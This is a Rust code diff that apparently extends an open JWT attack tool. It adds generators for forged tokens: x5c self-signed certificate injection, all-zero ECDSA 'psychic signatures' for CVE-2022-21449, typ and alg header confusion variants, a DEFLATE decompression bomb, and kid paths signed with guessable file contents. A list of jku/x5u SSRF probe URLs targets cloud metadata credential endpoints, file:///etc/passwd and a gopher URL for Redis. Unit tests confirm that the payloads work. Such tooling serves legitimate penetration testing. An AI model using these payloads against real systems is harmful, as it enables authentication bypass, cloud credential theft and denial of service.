@@ -425,6 +425,278 @@ pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
     payloads
 }
 
+/// Generate a JWT with a self-signed X.509 chain embedded in the `x5c` header.
+///
+/// Mirrors [`generate_jwk_embed_payload`] but uses the `x5c` certificate chain
+/// instead of a `jwk`. Generates a fresh RSA-2048 key pair, builds a minimal
+/// self-signed certificate, embeds its DER in `x5c` (base64 — *not* base64url —
+/// per RFC 7515 §4.1.6), and signs the token with the matching private key.
+/// Libraries that derive the verification key from `x5c[0]` will validate it.
+pub fn generate_x5c_signed_payload(token: &str) -> Result<String> {
+    use openssl::asn1::Asn1Time;
+    use openssl::bn::BigNum;
+    use openssl::hash::MessageDigest;
+    use openssl::pkey::PKey;
+    use openssl::rsa::Rsa;
+    use openssl::x509::{X509Builder, X509NameBuilder};
+
+    let claims_part = extract_claims_part(token)?;
+
+    let rsa = Rsa::generate(2048).map_err(|e| anyhow::anyhow!("RSA gen failed: {e}"))?;
+    let pkey = PKey::from_rsa(rsa).map_err(|e| anyhow::anyhow!("PKey from RSA failed: {e}"))?;
+
+    let mut name = X509NameBuilder::new()?;
+    name.append_entry_by_text("CN", "jwt-hack-injected")?;
+    let name = name.build();
+
+    let mut builder = X509Builder::new()?;
+    builder.set_version(2)?;
+    let serial = BigNum::from_u32(1)?.to_asn1_integer()?;
+    builder.set_serial_number(&serial)?;
+    builder.set_subject_name(&name)?;
+    builder.set_issuer_name(&name)?;
+    builder.set_pubkey(&pkey)?;
+    let not_before = Asn1Time::days_from_now(0)?;
+    let not_after = Asn1Time::days_from_now(365)?;
+    builder.set_not_before(&not_before)?;
+    builder.set_not_after(&not_after)?;
+    builder.sign(&pkey, MessageDigest::sha256())?;
+    let cert = builder.build();
+    let cert_der = cert.to_der()?;
+
+    // RFC 7515 §4.1.6: x5c values are standard base64, not URL-safe base64.
+    let cert_b64 = base64::engine::general_purpose::STANDARD.encode(&cert_der);
+
+    let header = json!({
+        "alg": "RS256",
+        "typ": "JWT",
+        "x5c": [cert_b64],
+    });
+
+    let input = build_signing_input(&header, claims_part)?;
+    let pem = pkey
+        .private_key_to_pem_pkcs8()
+        .map_err(|e| anyhow::anyhow!("export private key: {e}"))?;
+    let key = jsonwebtoken::EncodingKey::from_rsa_pem(&pem)?;
+    let sig_b64 =
+        jsonwebtoken::crypto::sign(input.as_bytes(), &key, jsonwebtoken::Algorithm::RS256)?;
+
+    info!("Generated x5c self-signed certificate payload (signed)");
+    Ok(format!("{input}.{sig_b64}"))
+}
+
+/// Generate ECDSA "psychic signature" payloads (CVE-2022-21449).
+///
+/// Java JDK 15–18 accepted ECDSA signatures with r=s=0. With those bytes in
+/// the signature segment, the JVM's verifier returned `true` regardless of
+/// the input. Emits ES256/ES384/ES512 variants — the signature is the
+/// algorithm's expected length filled with NUL bytes.
+pub fn generate_psychic_signature_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    // (alg, signature length in bytes)
+    // ES256: r||s = 32+32, ES384: 48+48, ES512: 66+66 (P-521 component size).
+    let variants = [("ES256", 64usize), ("ES384", 96), ("ES512", 132)];
+
+    let mut payloads = Vec::with_capacity(variants.len());
+    for (alg, sig_len) in variants {
+        let header = json!({ "alg": alg, "typ": "JWT" });
+        let input = build_signing_input(&header, claims_part)?;
+        let zero_sig = vec![0u8; sig_len];
+        let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&zero_sig);
+        payloads.push(format!("{input}.{sig_b64}"));
+    }
+    info!("Generated psychic-signature (CVE-2022-21449) payloads");
+    Ok(payloads)
+}
+
+/// Generate `typ` confusion header payloads.
+///
+/// Targets servers that key authorization decisions off `typ` (e.g. ID-token
+/// vs access-token discrimination, OAuth 2.0 `at+jwt`). All variants are
+/// header-only (header.payload, no signature) since the target server's
+/// behaviour determines whether the variant is exploitable.
+pub fn generate_typ_confusion_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    // (typ value, alg)
+    let variants: &[(Option<&str>, &str)] = &[
+        (None, "HS256"), // typ omitted entirely
+        (Some("at+jwt"), "HS256"),
+        (Some("JOSE"), "HS256"),
+        (Some("JOSE+JSON"), "HS256"),
+        (Some("application/jwt"), "HS256"),
+        (Some("jwt"), "HS256"),         // lowercase
+        (Some("JWT\u{0000}"), "HS256"), // trailing NUL
+    ];
+
+    let mut payloads = Vec::with_capacity(variants.len());
+    for (typ, alg) in variants {
+        let header = match typ {
+            Some(t) => json!({ "alg": alg, "typ": t }),
+            None => json!({ "alg": alg }),
+        };
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+    info!("Generated typ confusion payloads");
+    Ok(payloads)
+}
+
+/// Generate `alg` edge-value header payloads.
+///
+/// Probes parser quirks: empty, null, whitespace-padded, mixed-case, array
+/// forms. Each header is emitted unsigned (header.payload) because the
+/// interesting behaviour is the parser's interpretation of `alg`.
+pub fn generate_alg_edge_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    let variants: Vec<serde_json::Value> = vec![
+        json!({ "alg": "",        "typ": "JWT" }),
+        json!({ "alg": serde_json::Value::Null, "typ": "JWT" }),
+        json!({ "alg": " HS256 ", "typ": "JWT" }),
+        json!({ "alg": "\tHS256", "typ": "JWT" }),
+        json!({ "alg": "hs256",   "typ": "JWT" }),
+        json!({ "alg": "HS256\u{0000}", "typ": "JWT" }),
+        // Array forms — some parsers cast to string-ish.
+        json!({ "alg": ["none", "HS256"], "typ": "JWT" }),
+        json!({ "alg": ["HS256"], "typ": "JWT" }),
+    ];
+
+    let mut payloads = Vec::with_capacity(variants.len());
+    for header in variants {
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+    info!("Generated alg edge-value payloads");
+    Ok(payloads)
+}
+
+/// Built-in SSRF/internal-network probe URLs for jku/x5u attacks.
+///
+/// Useful when the server fetches the JWKS URL server-side — these probes
+/// don't require a controlled attacker domain.
+fn ssrf_probe_urls() -> &'static [&'static str] {
+    &[
+        // AWS IMDS v1
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        // GCP metadata
+        "http://metadata.google.internal/computeMetadata/v1/",
+        // Azure IMDS
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        // Loopback common services
+        "http://127.0.0.1:6379/",
+        "http://localhost:11211/",
+        "http://127.0.0.1:80/",
+        // Schemes
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6379/_INFO%0d%0a",
+        // DNS rebind / shorthand
+        "http://[::1]/",
+        "http://0.0.0.0/",
+    ]
+}
+
+/// Generate jku/x5u SSRF-probe payloads (no `--jwk-attack` required).
+pub fn generate_jku_x5u_ssrf_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+    let mut payloads = Vec::new();
+    for key_type in ["jku", "x5u"] {
+        for url in ssrf_probe_urls() {
+            let header = json!({
+                "alg": "hs256",
+                key_type: url,
+                "typ": "JWT",
+            });
+            payloads.push(encode_header_with_claims(&header, claims_part)?);
+        }
+    }
+    info!("Generated jku/x5u SSRF probe payloads");
+    Ok(payloads)
+}
+
+/// Generate `zip` parameter variants and a DEFLATE decompression-bomb claim.
+///
+/// Covers: non-standard zip values (GZIP, unknown, null), and a real
+/// compression bomb where the encoded claims segment is small but decompresses
+/// to a large JSON object — useful for probing DoS handling.
+pub fn generate_zip_payload(token: &str) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+    let mut payloads = Vec::new();
+
+    // Non-standard zip header values — claims segment stays the original.
+    for zip_val in [
+        json!("GZIP"),
+        json!("unknown"),
+        json!(""),
+        serde_json::Value::Null,
+        json!(["DEF"]),
+    ] {
+        let header = json!({ "alg": "HS256", "typ": "JWT", "zip": zip_val });
+        payloads.push(encode_header_with_claims(&header, claims_part)?);
+    }
+
+    // Decompression bomb: payload of 1 MiB of 'A' characters wrapped in a JSON
+    // string. DEFLATE compresses this down to a few hundred bytes; the server
+    // pays the decompression cost.
+    let bomb_json = format!("{{\"data\":\"{}\"}}", "A".repeat(1024 * 1024));
+    let compressed = crate::utils::compression::compress_deflate(bomb_json.as_bytes())?;
+    let bomb_claims_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&compressed);
+    let bomb_header = json!({ "alg": "HS256", "typ": "JWT", "zip": "DEF" });
+    let bomb_header_json = serde_json::to_string(&bomb_header)?;
+    let bomb_header_b64 = general_purpose::URL_SAFE_NO_PAD.encode(bomb_header_json.as_bytes());
+    // Sign with empty HMAC so downstream test consumers can verify shape; the
+    // server may reject before signature check, which is itself useful info.
+    let signing = format!("{bomb_header_b64}.{bomb_claims_b64}");
+    payloads.push(sign_hs256(&signing, b""));
+
+    info!("Generated zip variant + decompression bomb payloads");
+    Ok(payloads)
+}
+
+/// Generate `kid` payloads pointing at predictable, content-stable files.
+///
+/// When `secret_bytes` is provided, every payload is HS256-signed with those
+/// bytes (matching the file's contents on disk). With `None`, only the empty
+/// secret is assumed — useful for `/dev/null`-style nulls, otherwise the
+/// caller should re-sign with the file's bytes once known.
+pub fn generate_kid_predictable_payload(
+    token: &str,
+    secret_bytes: Option<&[u8]>,
+) -> Result<Vec<String>> {
+    let claims_part = extract_claims_part(token)?;
+
+    let candidate_paths = [
+        "css/main.css",
+        "static/css/main.css",
+        "js/main.js",
+        "static/js/main.js",
+        "robots.txt",
+        "favicon.ico",
+        "index.html",
+        "../static/css/main.css",
+        "../../static/css/main.css",
+        "../../../static/css/main.css",
+        "public/index.html",
+        "assets/logo.svg",
+    ];
+
+    let secret = secret_bytes.unwrap_or(b"");
+    let mut payloads = Vec::with_capacity(candidate_paths.len());
+    for kid in candidate_paths {
+        let header = json!({
+            "alg": "HS256",
+            "typ": "JWT",
+            "kid": kid,
+        });
+        let input = build_signing_input(&header, claims_part)?;
+        payloads.push(sign_hs256(&input, secret));
+    }
+    info!(
+        "Generated kid predictable-path payloads ({} bytes secret)",
+        secret.len()
+    );
+    Ok(payloads)
+}
+
 /// Generate all available payloads for a token
 pub fn generate_all_payloads(
     token: &str,
@@ -516,6 +788,41 @@ pub fn generate_all_payloads(
     // Empty / stripped signature payloads
     if should_generate_all || targets.contains("empty_sig") {
         payloads.extend(generate_empty_sig_payload(token)?);
+    }
+
+    // x5c self-signed certificate (real, signed attack)
+    if should_generate_all || targets.contains("x5c_signed") {
+        payloads.push(generate_x5c_signed_payload(token)?);
+    }
+
+    // ECDSA psychic signatures (CVE-2022-21449)
+    if should_generate_all || targets.contains("psychic") {
+        payloads.extend(generate_psychic_signature_payload(token)?);
+    }
+
+    // typ confusion header variants
+    if should_generate_all || targets.contains("typ_confusion") {
+        payloads.extend(generate_typ_confusion_payload(token)?);
+    }
+
+    // alg edge values
+    if should_generate_all || targets.contains("alg_edge") {
+        payloads.extend(generate_alg_edge_payload(token)?);
+    }
+
+    // jku/x5u SSRF probes (no --jwk-attack required)
+    if should_generate_all || targets.contains("ssrf") {
+        payloads.extend(generate_jku_x5u_ssrf_payload(token)?);
+    }
+
+    // zip variants + decompression bomb
+    if should_generate_all || targets.contains("zip") {
+        payloads.extend(generate_zip_payload(token)?);
+    }
+
+    // kid predictable-path payloads (empty secret; CLI may pass bytes later)
+    if should_generate_all || targets.contains("kid_predictable") {
+        payloads.extend(generate_kid_predictable_payload(token, None)?);
     }
 
     Ok(payloads)
@@ -1090,5 +1397,143 @@ mod tests {
             get_header_from_token(p).and_then(|h| h.get("b64").and_then(|v| v.as_bool()))
                 == Some(false)
         }));
+    }
+
+    #[test]
+    fn test_generate_psychic_signature_zero_sigs() {
+        let payloads = generate_psychic_signature_payload(DUMMY_TOKEN).expect("psychic ok");
+        assert_eq!(payloads.len(), 3);
+
+        let expected_lens = [("ES256", 64usize), ("ES384", 96), ("ES512", 132)];
+        for (p, (alg, len)) in payloads.iter().zip(expected_lens.iter()) {
+            let parts: Vec<&str> = p.split('.').collect();
+            assert_eq!(parts.len(), 3);
+            let header = get_header_from_token(p).unwrap();
+            assert_eq!(header.get("alg").unwrap().as_str(), Some(*alg));
+            let sig = URL_SAFE_NO_PAD.decode(parts[2]).unwrap();
+            assert_eq!(sig.len(), *len);
+            assert!(sig.iter().all(|b| *b == 0));
+        }
+    }
+
+    #[test]
+    fn test_generate_typ_confusion_variants() {
+        let payloads = generate_typ_confusion_payload(DUMMY_TOKEN).expect("typ ok");
+        // At least the documented variants are present.
+        let typ_values: Vec<Option<String>> = payloads
+            .iter()
+            .map(|p| {
+                get_header_from_token(p)
+                    .and_then(|h| h.get("typ").and_then(|v| v.as_str().map(String::from)))
+            })
+            .collect();
+        assert!(typ_values.contains(&Some("at+jwt".to_string())));
+        assert!(typ_values.contains(&Some("JOSE".to_string())));
+        assert!(typ_values.contains(&None), "one variant must omit typ");
+    }
+
+    #[test]
+    fn test_generate_alg_edge_variants() {
+        let payloads = generate_alg_edge_payload(DUMMY_TOKEN).expect("alg edge ok");
+        // Empty string, null, and an array variant must each appear.
+        let algs: Vec<serde_json::Value> = payloads
+            .iter()
+            .filter_map(|p| get_header_from_token(p).and_then(|h| h.get("alg").cloned()))
+            .collect();
+        assert!(algs
+            .iter()
+            .any(|v| v == &serde_json::Value::String(String::new())));
+        assert!(algs.iter().any(|v| v == &serde_json::Value::Null));
+        assert!(algs.iter().any(|v| v.is_array()));
+    }
+
+    #[test]
+    fn test_generate_jku_x5u_ssrf_emits_both_keys_and_imds() {
+        let payloads = generate_jku_x5u_ssrf_payload(DUMMY_TOKEN).expect("ssrf ok");
+        let mut saw_jku_imds = false;
+        let mut saw_x5u_imds = false;
+        for p in &payloads {
+            let h = get_header_from_token(p).unwrap();
+            if let Some(u) = h.get("jku").and_then(|v| v.as_str()) {
+                if u.contains("169.254.169.254") {
+                    saw_jku_imds = true;
+                }
+            }
+            if let Some(u) = h.get("x5u").and_then(|v| v.as_str()) {
+                if u.contains("169.254.169.254") {
+                    saw_x5u_imds = true;
+                }
+            }
+        }
+        assert!(saw_jku_imds, "expected jku payload with IMDS URL");
+        assert!(saw_x5u_imds, "expected x5u payload with IMDS URL");
+    }
+
+    #[test]
+    fn test_generate_zip_payload_bomb_decompresses_large() {
+        let payloads = generate_zip_payload(DUMMY_TOKEN).expect("zip ok");
+        // The bomb variant should have zip=DEF and a small encoded claims part
+        // that decompresses to substantially more bytes than the raw segment.
+        let bomb = payloads
+            .iter()
+            .find(|p| {
+                let h = get_header_from_token(p).unwrap();
+                h.get("zip").and_then(|v| v.as_str()) == Some("DEF")
+            })
+            .expect("bomb variant present");
+        let parts: Vec<&str> = bomb.split('.').collect();
+        let claims_compressed = URL_SAFE_NO_PAD.decode(parts[1]).unwrap();
+        let decompressed =
+            crate::utils::compression::decompress_deflate(&claims_compressed).unwrap();
+        assert!(
+            decompressed.len() > claims_compressed.len() * 50,
+            "bomb should expand >50x: compressed={}, decompressed={}",
+            claims_compressed.len(),
+            decompressed.len()
+        );
+    }
+
+    #[test]
+    fn test_generate_kid_predictable_signs_with_provided_secret() {
+        let secret = b"body{color:red}";
+        let payloads =
+            generate_kid_predictable_payload(DUMMY_TOKEN, Some(secret)).expect("kid pred ok");
+        assert!(!payloads.is_empty());
+        for p in &payloads {
+            let parts: Vec<&str> = p.split('.').collect();
+            assert_eq!(parts.len(), 3);
+            let input = format!("{}.{}", parts[0], parts[1]);
+            let expected = hmac_sha256::HMAC::mac(input.as_bytes(), secret);
+            let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
+            assert_eq!(parts[2], expected_b64);
+        }
+    }
+
+    #[test]
+    fn test_generate_x5c_signed_payload_verifies_against_embedded_cert() {
+        use jsonwebtoken::{Algorithm, DecodingKey, Validation};
+        let token = generate_x5c_signed_payload(DUMMY_TOKEN).expect("x5c signed ok");
+        let header = get_header_from_token(&token).expect("header");
+        let x5c = header.get("x5c").unwrap().as_array().unwrap();
+        let cert_b64 = x5c[0].as_str().unwrap();
+        // x5c is standard base64, not URL-safe.
+        let cert_der = base64::engine::general_purpose::STANDARD
+            .decode(cert_b64)
+            .unwrap();
+
+        // Parse the cert with openssl and grab the public key as PEM.
+        let cert = openssl::x509::X509::from_der(&cert_der).unwrap();
+        let pubkey_pem = cert.public_key().unwrap().public_key_to_pem().unwrap();
+
+        let key = DecodingKey::from_rsa_pem(&pubkey_pem).unwrap();
+        let mut v = Validation::new(Algorithm::RS256);
+        v.validate_exp = false;
+        v.required_spec_claims.clear();
+        let result = jsonwebtoken::decode::<serde_json::Value>(&token, &key, &v);
+        assert!(
+            result.is_ok(),
+            "signature should verify with the embedded cert's key: {:?}",
+            result.err()
+        );
     }
 }
